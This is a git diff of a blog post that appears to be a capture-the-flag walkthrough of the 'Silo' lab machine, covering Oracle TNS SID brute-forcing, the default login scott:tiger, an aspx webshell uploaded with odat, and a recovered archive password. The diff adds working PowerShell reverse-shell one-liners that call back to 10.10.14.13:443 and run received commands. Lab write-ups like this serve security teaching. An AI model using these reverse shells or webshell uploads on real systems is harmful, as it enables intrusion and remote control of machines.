@@ -91,6 +91,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Sounds we have nothing interesting on port 80 HTTP.<br>
 Then, try to take a look at Oracle TNS listener.<br>
 At first, try to get SIDs.<br>
+<br>
 <em>The Oracle System ID (SID) is used to uniquely identify a particular database on a system. For this reason, one cannot have more than one database with the same SID on a computer system.</em>
 {% highlight shell %}
 msf5 auxiliary(admin/oracle/sid_brute) > use auxiliary/admin/oracle/sid_brute 
@@ -121,6 +122,10 @@ msf5 auxiliary(admin/oracle/sid_brute) > run
 
 Next, try some default credentials.<br>
 We can find the list in the <a href="https://docs.oracle.com/cd/B19306_01/install.102/b25300/rev_precon_db.htm">Oracle Database Installation Guide</a>.<br>
+This time, following credential worked.<br>
+{% highlight shell %}
+scott:tiger
+{% endhighlight %}
 {% highlight shell %}
 root@kali:/opt/oracle/instantclient_19_3# ./sqlplus SCOTT/tiger@10.10.10.82:1521/XE
 
@@ -142,6 +147,10 @@ SQL>
 
 For the Oracle penetration testing, we can use a script "<a href="https://github.com/quentinhardy/odat">odat.py</a>".<br>
 It is not installed by default, we have to install with "apt-get"<br>
+{% highlight shell %}
+apt-get install odat
+{% endhighlight %}
+
 Then, upload a aspx webshell which is installed on Kali linux by default.<br>
 To upload a file, we need an option "dbmsadvisor".
 {% highlight shell %}
@@ -163,9 +172,9 @@ For the reverse shell, we can use <a href="https://github.com/samratashok/nishan
 {% highlight shell %}
 #A simple and small reverse shell. Options and help removed to save space. 
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
-$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$sm=(New-Object Net.Sockets.TCPClient('10.10.14.13',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 {% endhighlight %}
 
 Next, run a simple web server that hosts the powershell script.
@@ -229,10 +238,10 @@ link password:
 Then, try to access to the dropbox.<br>
 However, above password doesn't work. To obtain a correct password, we need to use the webshell which we uploaded.<br>
 After that, download the file "SILO-20180105-221806.zip".
+![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-06-31.png)
 {% highlight shell %}
 £%Hm8646uC$
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-06-31.png)
 ![placeholder](https://inar1.github.io/public/images/2019-11-06/2019-11-06-19-08-14.png)
 
 By unzip, we can get a file which contains memory dump.<br>
